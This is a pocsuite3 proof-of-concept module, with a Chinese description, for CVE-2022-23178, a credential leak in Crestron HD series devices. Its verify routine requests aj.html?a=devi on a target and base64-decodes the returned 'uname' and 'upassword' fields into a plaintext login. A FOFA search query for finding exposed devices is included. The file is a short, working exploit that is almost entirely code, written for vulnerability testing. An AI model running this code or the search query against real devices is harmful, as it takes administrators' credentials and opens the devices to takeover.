"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit https://pocsuite.org
"""
import re, base64, json
from pocsuite3.lib.core.data import logger
from collections import OrderedDict
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text

class DemoPOC(POCBase):
    vulID = '17'  
    author = ['PeiQi']
    name = 'Crestron aj.html 账号密码泄漏漏洞 CVE-2022-23178'
    vulType = VUL_TYPE.PATH_DISCLOSURE
    desc = '''Crestron HD等系列设备 aj.html页面调用特定的参数可以获取账号密码等敏感信息。
    '''
    appPowerLink = 'https://de.crestron.com/Products/Video/HDMI-Solutions/HDMI-Switchers/HD-MD4X2-4K-E'
    appName = 'Crestron'
    appVersion = 'Crestron HD等系列设备'
    fofa_dork = {'fofa': 'app="Crestron-HD-RX-201-C-E"'} 
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        return o

    def _verify(self):
        result = {}
        url = self.url.rstrip('/') + "/aj.html?a=devi"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            resp = requests.get(url, headers=headers, timeout=5)
            if 'upassword' in resp.text and 'uname' in resp.text and resp.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Response'] = resp.text
                result['VerifyInfo']['User/Pass'] = str(base64.b64decode(json.loads(resp.text)["uname"]), 'utf8') + "/" + str(base64.b64decode(json.loads(resp.text)["upassword"]), 'utf8')
        except Exception as ex:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)